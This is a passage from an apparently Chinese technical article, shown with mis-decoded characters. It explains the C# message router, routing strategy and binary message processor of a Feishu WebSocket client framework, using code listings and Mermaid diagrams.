    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;IMessageHandler&gt; _handlers;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MessageRouter</span>(<span class="hljs-params">ILogger&lt;MessageRouter&gt; logger, FeishuWebSocketOptions options</span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _handlers = <span class="hljs-keyword">new</span> List&lt;IMessageHandler&gt;();
        _options = options;
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">IMessageHandler handler</span>)</span>
    {
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(handler));

        _handlers.Add(handler);
        _logger.LogDebug(<span class="hljs-string">"å·²æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨: {HandlerType}"</span>, handler.GetType().Name);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ç§»é™¤æ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">UnregisterHandler</span>(<span class="hljs-params">IMessageHandler handler</span>)</span>
    {
        <span class="hljs-keyword">var</span> removed = _handlers.Remove(handler);
        <span class="hljs-keyword">if</span> (removed)
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogDebug(<span class="hljs-string">"å·²ç§»é™¤æ¶ˆæ¯å¤„ç†å™¨: {HandlerType}"</span>, handler.GetType().Name);
            }
        }
        <span class="hljs-keyword">return</span> removed;
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±æ¶ˆæ¯åˆ°åˆé€‚çš„å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(message))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogWarning(<span class="hljs-string">"æ”¶åˆ°ç©ºæ¶ˆæ¯ï¼Œè·³è¿‡è·¯ç”±"</span>);
            }
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">await</span> RouteMessageInternalAsync(message, <span class="hljs-string">"Text"</span>, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±ä»äºŒè¿›åˆ¶æ¶ˆæ¯è½¬æ¢è€Œæ¥çš„JSONæ¶ˆæ¯åˆ°åˆé€‚çš„å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteBinaryMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> jsonContent, <span class="hljs-built_in">string</span> messageType, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(jsonContent))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogWarning(<span class="hljs-string">"æ”¶åˆ°ç©ºçš„äºŒè¿›åˆ¶è½¬æ¢æ¶ˆæ¯ï¼Œè·³è¿‡è·¯ç”±"</span>);
            }
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">await</span> RouteMessageInternalAsync(jsonContent, <span class="hljs-string">$"Binary_<span class="hljs-subst">{messageType}</span>"</span>, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æå–æ¶ˆæ¯ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ExtractMessageType</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> jsonDoc = System.Text.Json.JsonDocument.Parse(message);
            <span class="hljs-keyword">var</span> root = jsonDoc.RootElement;

            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºv2.0ç‰ˆæœ¬</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"schema"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> schemaElement) &amp;&amp;
                schemaElement.GetString() == <span class="hljs-string">"2.0"</span>)
            {
                <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"header"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> headerElement) &amp;&amp;
                    headerElement.TryGetProperty(<span class="hljs-string">"event_type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> eventTypeElement))
                {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"event"</span>; <span class="hljs-comment">// v2.0ä¸»è¦æ˜¯äº‹ä»¶æ¶ˆæ¯</span>
                }
            }

            <span class="hljs-comment">// v1.0ç‰ˆæœ¬å¤„ç†</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> typeElement))
            {
                <span class="hljs-keyword">return</span> typeElement.GetString()?.ToLowerInvariant() ?? <span class="hljs-built_in">string</span>.Empty;
            }

            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
        <span class="hljs-keyword">catch</span> (System.Text.Json.JsonException ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è§£ææ¶ˆæ¯JSONå¤±è´¥: {Message}"</span>, message);
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å†…éƒ¨æ¶ˆæ¯è·¯ç”±å¤„ç†</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageInternalAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> sourceType, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// æå–æ¶ˆæ¯ç±»å‹</span>
            <span class="hljs-keyword">var</span> messageType = ExtractMessageType(message);
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(messageType))
            {
                _logger.LogWarning(<span class="hljs-string">"æ— æ³•æå–æ¶ˆæ¯ç±»å‹ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// æŸ¥æ‰¾èƒ½å¤„ç†è¯¥æ¶ˆæ¯ç±»å‹çš„å¤„ç†å™¨</span>
            <span class="hljs-keyword">var</span> handler = _handlers.FirstOrDefault(h =&gt; h.CanHandle(messageType));
            <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
            {
                _logger.LogWarning(<span class="hljs-string">"æœªæ‰¾åˆ°èƒ½å¤„ç†æ¶ˆæ¯ç±»å‹ {MessageType} çš„å¤„ç†å™¨ (æ¥æº: {SourceType})"</span>, messageType, sourceType);
                <span class="hljs-keyword">return</span>;
            }
            _logger.LogDebug(<span class="hljs-string">"å°†æ¶ˆæ¯è·¯ç”±åˆ°å¤„ç†å™¨: {HandlerType} (æ¥æº: {SourceType}, æ¶ˆæ¯ç±»å‹: {MessageType})"</span>,
                    handler.GetType().Name, sourceType, messageType);
            <span class="hljs-keyword">await</span> handler.HandleAsync(message, cancellationToken);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è·¯ç”±æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
        }
    }
}
</code></pre>
<p><strong>æ¶ˆæ¯è·¯ç”±æµç¨‹è¯¦è§£</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨çš„æ ¸å¿ƒèŒè´£æ˜¯æ ¹æ®æ¶ˆæ¯ç‰¹å¾è¿›è¡Œæ™ºèƒ½åˆ†å‘ï¼Œå…¶å·¥ä½œæµç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯é¢„éªŒè¯</strong>ï¼šæ£€æŸ¥æ¶ˆæ¯çš„åŸºæœ¬æ ¼å¼å’Œæœ‰æ•ˆæ€§</li>
<li><strong>ç‰ˆæœ¬è¯†åˆ«</strong>ï¼šé€šè¿‡schemaå­—æ®µæˆ–typeå­—æ®µç¡®å®šæ¶ˆæ¯ç‰ˆæœ¬</li>
<li><strong>ç±»å‹åŒ¹é…</strong>ï¼šæ ¹æ®æ¶ˆæ¯å†…å®¹æ‰¾åˆ°å¯¹åº”çš„å¤„ç†å™¨</li>
<li><strong>å¼‚æ­¥åˆ†å‘</strong>ï¼šå°†æ¶ˆæ¯å¼‚æ­¥å‘é€ç»™åŒ¹é…çš„å¤„ç†å™¨</li>
<li><strong>ç»“æœèšåˆ</strong>ï¼šæ”¶é›†å¤„ç†ç»“æœå¹¶è¿›è¡Œåç»­å¤„ç†</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant WS as WebSocket
    participant Router as æ¶ˆæ¯è·¯ç”±å™¨
    participant Validator as æ¶ˆæ¯éªŒè¯å™¨
    participant Detector as ç‰ˆæœ¬æ£€æµ‹å™¨
    participant Registry as å¤„ç†å™¨æ³¨å†Œè¡¨
    participant Handler as æ¶ˆæ¯å¤„ç†å™¨
    participant Logger as æ—¥å¿—ç³»ç»Ÿ
    
    WS-&gt;&gt;Router: RouteMessageAsync(message)
    Router-&gt;&gt;Router: æ£€æŸ¥æ¶ˆæ¯æœ‰æ•ˆæ€§
    
    alt æ¶ˆæ¯æœ‰æ•ˆ
        Router-&gt;&gt;Detector: DetectMessageVersion(message)
        Detector-&gt;&gt;Detector: è§£æJSONç»“æ„
        Detector-&gt;&gt;Detector: æ£€æŸ¥schemaå­—æ®µ
        Detector-&gt;&gt;Detector: æ£€æŸ¥typeå­—æ®µ
        
        alt v2.0æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›v2.0ä¿¡æ¯
        else v1.0æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›v1.0ä¿¡æ¯
        else æœªçŸ¥æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›unknown
        end
        
        Router-&gt;&gt;Registry: æŸ¥æ‰¾åŒ¹é…å¤„ç†å™¨
        Registry-&gt;&gt;Registry: éå†å¤„ç†å™¨åˆ—è¡¨
        Registry-&gt;&gt;Registry: åŒ¹é…å¤„ç†æ¡ä»¶
        
        alt æ‰¾åˆ°å¤„ç†å™¨
            Registry--&gt;&gt;Router: è¿”å›åŒ¹é…å¤„ç†å™¨
            Router-&gt;&gt;Handler: å¤„ç†æ¶ˆæ¯(å¼‚æ­¥)
            Handler-&gt;&gt;Handler: æ‰§è¡Œä¸šåŠ¡é€»è¾‘
            Handler--&gt;&gt;Router: è¿”å›å¤„ç†ç»“æœ
            Router-&gt;&gt;Logger: è®°å½•å¤„ç†æˆåŠŸ
        else æœªæ‰¾åˆ°å¤„ç†å™¨
            Registry--&gt;&gt;Router: æ— åŒ¹é…å¤„ç†å™¨
            Router-&gt;&gt;Logger: è®°å½•æœªæ‰¾åˆ°å¤„ç†å™¨
        end
    else æ¶ˆæ¯æ— æ•ˆ
        Router-&gt;&gt;Logger: è®°å½•ç©ºæ¶ˆæ¯è­¦å‘Š
    end
</code></pre>
<p><strong>è·¯ç”±ç­–ç•¥è®¾è®¡</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨é‡‡ç”¨å¤šç»´åº¦åŒ¹é…ç­–ç•¥ï¼Œç¡®ä¿æ¶ˆæ¯èƒ½å¤Ÿç²¾ç¡®è·¯ç”±ï¼š</p>
<ol>
<li>
<p><strong>åŸºäºç‰ˆæœ¬çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>v1.0åè®®ï¼šé€šè¿‡<code>type</code>å­—æ®µè¯†åˆ«æ¶ˆæ¯ç±»å‹</li>
<li>v2.0åè®®ï¼šé€šè¿‡<code>schema</code>å­—æ®µç¡®è®¤ç‰ˆæœ¬</li>
<li>å‘åå…¼å®¹ï¼šæ”¯æŒæ—§ç‰ˆæœ¬æ¶ˆæ¯æ ¼å¼</li>
</ul>
</li>
<li>
<p><strong>åŸºäºç±»å‹çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶æ¶ˆæ¯ï¼š<code>event</code>ç±»å‹ï¼Œå¦‚æ¶ˆæ¯æ¥æ”¶ã€çŠ¶æ€å˜æ›´</li>
<li>å“åº”æ¶ˆæ¯ï¼š<code>response</code>ç±»å‹ï¼Œå¦‚è®¤è¯å“åº”ã€æ“ä½œç»“æœ</li>
<li>é€šçŸ¥æ¶ˆæ¯ï¼š<code>notification</code>ç±»å‹ï¼Œå¦‚ç³»ç»Ÿé€šçŸ¥</li>
</ul>
</li>
<li>
<p><strong>åŸºäºä¼˜å…ˆçº§çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>é«˜ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šè®¤è¯ã€å¿ƒè·³ç­‰å…³é”®æ¶ˆæ¯</li>
<li>ä¸­ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šä¸šåŠ¡äº‹ä»¶ã€ç”¨æˆ·æ¶ˆæ¯</li>
<li>ä½ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šç»Ÿè®¡æ•°æ®ã€æ—¥å¿—ä¿¡æ¯</li>
</ul>
</li>
</ol>
<p><strong>å¤„ç†å™¨æ³¨å†Œæœºåˆ¶</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨æ”¯æŒåŠ¨æ€æ³¨å†Œå’Œæ³¨é”€æ¶ˆæ¯å¤„ç†å™¨ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ³¨å†Œå¤„ç†å™¨</span>
router.RegisterHandler(<span class="hljs-keyword">new</span> AuthMessageHandler());
router.RegisterHandler(<span class="hljs-keyword">new</span> EventMessageHandler());
router.RegisterHandler(<span class="hljs-keyword">new</span> BinaryMessageHandler());

<span class="hljs-comment">// å¤„ç†å™¨æ¥å£å®šä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IMessageHandler</span>
{
    <span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CanHandle</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> messageType, MessageVersionInfo version</span>)</span>;
    <span class="hljs-function">Task&lt;HandlerResult&gt; <span class="hljs-title">HandleAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken</span>)</span>;
    <span class="hljs-built_in">int</span> Priority { <span class="hljs-keyword">get</span>; }
}
</code></pre>
<p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p>
<ol>
<li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šæ”¯æŒå¤šä¸ªæ¶ˆæ¯å¹¶è¡Œå¤„ç†ï¼Œæé«˜ååé‡</li>
<li><strong>ç¼“å­˜æœºåˆ¶</strong>ï¼šç¼“å­˜å¤„ç†å™¨åŒ¹é…ç»“æœï¼Œå‡å°‘é‡å¤è®¡ç®—</li>
<li><strong>æ‰¹å¤„ç†</strong>ï¼šæ”¯æŒæ‰¹é‡æ¶ˆæ¯å¤„ç†ï¼Œå‡å°‘ç½‘ç»œå¼€é”€</li>
<li><strong>è¿æ¥æ± </strong>ï¼šå¤ç”¨è¿æ¥èµ„æºï¼Œæé«˜è¿æ¥æ•ˆç‡</li>
</ol>
<p><strong>é”™è¯¯å¤„ç†æœºåˆ¶</strong></p>
<ol>
<li><strong>å®¹é”™è®¾è®¡</strong>ï¼šå•ä¸ªå¤„ç†å™¨å¼‚å¸¸ä¸å½±å“å…¶ä»–å¤„ç†å™¨</li>
<li><strong>é™çº§ç­–ç•¥</strong>ï¼šæ— åŒ¹é…å¤„ç†å™¨æ—¶ä½¿ç”¨é»˜è®¤å¤„ç†é€»è¾‘</li>
<li><strong>é‡è¯•æœºåˆ¶</strong>ï¼šå¤„ç†å¤±è´¥æ—¶æ”¯æŒè‡ªåŠ¨é‡è¯•</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šè®°å½•å¤„ç†å¼‚å¸¸å¹¶è§¦å‘å‘Šè­¦æœºåˆ¶</li>
</ol>
<p><strong>å¤„ç†å™¨åˆ†å‘æœºåˆ¶</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±ç­–ç•¥å®ç°</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">RoutingStrategy</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;MessageRouter&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> sourceType, 
        List&lt;IMessageHandler&gt; handlers, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æå–æ¶ˆæ¯ç±»å‹</span>
        <span class="hljs-keyword">var</span> messageType = ExtractMessageType(message);
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(messageType))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogWarning(<span class="hljs-string">"æ— æ³•æå–æ¶ˆæ¯ç±»å‹ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// æŸ¥æ‰¾èƒ½å¤„ç†è¯¥æ¶ˆæ¯ç±»å‹çš„å¤„ç†å™¨</span>
        <span class="hljs-keyword">var</span> handler = handlers.FirstOrDefault(h =&gt; h.CanHandle(messageType));
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogWarning(<span class="hljs-string">"æœªæ‰¾åˆ°èƒ½å¤„ç†æ¶ˆæ¯ç±»å‹ {MessageType} çš„å¤„ç†å™¨ (æ¥æº: {SourceType})"</span>, 
                    messageType, sourceType);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogDebug(<span class="hljs-string">"å°†æ¶ˆæ¯è·¯ç”±åˆ°å¤„ç†å™¨: {HandlerType} (æ¥æº: {SourceType}, æ¶ˆæ¯ç±»å‹: {MessageType})"</span>,
                handler.GetType().Name, sourceType, messageType);
        
        <span class="hljs-keyword">await</span> handler.HandleAsync(message, cancellationToken);
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æå–æ¶ˆæ¯ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ExtractMessageType</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> jsonDoc = JsonDocument.Parse(message);
            <span class="hljs-keyword">var</span> root = jsonDoc.RootElement;
            
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºv2.0ç‰ˆæœ¬</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"schema"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> schemaElement) &amp;&amp;
                schemaElement.GetString() == <span class="hljs-string">"2.0"</span>)
            {
                <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"header"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> headerElement) &amp;&amp;
                    headerElement.TryGetProperty(<span class="hljs-string">"event_type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> eventTypeElement))
                {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"event"</span>; <span class="hljs-comment">// v2.0ä¸»è¦æ˜¯äº‹ä»¶æ¶ˆæ¯</span>
                }
            }
            
            <span class="hljs-comment">// v1.0ç‰ˆæœ¬å¤„ç†</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> typeElement))
            {
                <span class="hljs-keyword">return</span> typeElement.GetString()?.ToLowerInvariant() ?? <span class="hljs-built_in">string</span>.Empty;
            }
            
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
        <span class="hljs-keyword">catch</span> (JsonException ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è§£ææ¶ˆæ¯JSONå¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
    }
}
</code></pre>
<h3 data-id="heading-11">3.4 äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨ï¼ˆBinaryMessageProcessorï¼‰</h3>
<p>äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨æ˜¯é£ä¹¦WebSocketæ¡†æ¶ä¸­ä¸“é—¨å¤„ç†äºŒè¿›åˆ¶æ•°æ®æµçš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£å¢é‡æ¥æ”¶ã€æ•°æ®ç»„è£…ã€æ ¼å¼è§£æå’Œæ¶ˆæ¯åˆ†å‘ã€‚å®ƒé‡‡ç”¨æµå¼å¤„ç†æ¶æ„ï¼Œæ”¯æŒå¤§æ¶ˆæ¯çš„åˆ†ç‰‡æ¥æ”¶å’Œè§£æã€‚</p>
<p><strong>äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†æ¶æ„</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[WebSocketäºŒè¿›åˆ¶æ•°æ®] --&gt; B[äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨]
    B --&gt; C[æ•°æ®æ¥æ”¶ç®¡ç†]
    C --&gt; D{æ¶ˆæ¯çŠ¶æ€}
    
    D --&gt;|æ–°æ¶ˆæ¯| E[åˆå§‹åŒ–å†…å­˜æµ]
    D --&gt;|æ¶ˆæ¯ç‰‡æ®µ| F[å†™å…¥æ•°æ®ç‰‡æ®µ]
    D --&gt;|æ¶ˆæ¯å®Œæˆ| G[ç»„è£…å®Œæ•´æ•°æ®]
    
    E --&gt; H[æ£€æŸ¥å¤§å°é™åˆ¶]
    F --&gt; H
    H --&gt; I{å¤§å°è¶…é™?}
    
    I --&gt;|æ˜¯| J[è§¦å‘é”™è¯¯äº‹ä»¶]
    I --&gt;|å¦| K[ç»§ç»­æ¥æ”¶]
    
    G --&gt; L[ProtoBufè§£æ]
    L --&gt; M{è§£ææˆåŠŸ?}
    
    M --&gt;|æ˜¯| N[æå–JSON Payload]
    M --&gt;|å¦| O[JSON Fallback]
    
    N --&gt; P[è·¯ç”±åˆ°MessageRouter]
    O --&gt; P
    P --&gt; Q[å‘é€ACKå“åº”]
    
    J --&gt; R[æ¸…ç†èµ„æº]
    Q --&gt; R
    
    style B fill:#e1f5fe
    style C fill:#fff3e0
    style L fill:#f3e5f5
    style P fill:#e8f5e8
</code></pre>
<p><strong>å¢é‡æ•°æ®æ¥æ”¶</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨ - è´Ÿè´£å¤„ç†äºŒè¿›åˆ¶æ•°æ®çš„å¢é‡æ¥æ”¶å’Œè§£æ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BinaryMessageProcessor</span> : <span class="hljs-title">IDisposable</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;BinaryMessageProcessor&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    <span class="hljs-keyword">private</span> MemoryStream? _binaryDataStream;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">object</span> _binaryDataStreamLock = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();
    <span class="hljs-keyword">private</span> DateTime _binaryDataReceiveStartTime = DateTime.MinValue;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _disposed = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> MessageRouter? _messageRouter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebSocketConnectionManager? _connectionManager;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketBinaryMessageEventArgs&gt;? BinaryMessageReceived;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? Error;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†äºŒè¿›åˆ¶æ•°æ®</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBinaryDataAsync</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] data, <span class="hljs-built_in">int</span> offset, <span class="hljs-built_in">int</span> count, 
        <span class="hljs-built_in">bool</span> endOfMessage, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">lock</span> (_binaryDataStreamLock)
            {
                <span class="hljs-comment">// å¦‚æœæ˜¯æ–°æ¶ˆæ¯çš„å¼€å§‹ï¼Œåˆå§‹åŒ–å†…å­˜æµ</span>
                <span class="hljs-keyword">if</span> (_binaryDataStream == <span class="hljs-literal">null</span>)
                {
                    _binaryDataStream = <span class="hljs-keyword">new</span> MemoryStream();
                    _binaryDataReceiveStartTime = DateTime.UtcNow;
                    
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogDebug(<span class="hljs-string">"å¼€å§‹æ¥æ”¶æ–°çš„äºŒè¿›åˆ¶æ¶ˆæ¯"</span>);
                }
                
                <span class="hljs-comment">// å†™å…¥æ•°æ®ç‰‡æ®µ</span>
                _binaryDataStream.Write(data, offset, count);
                
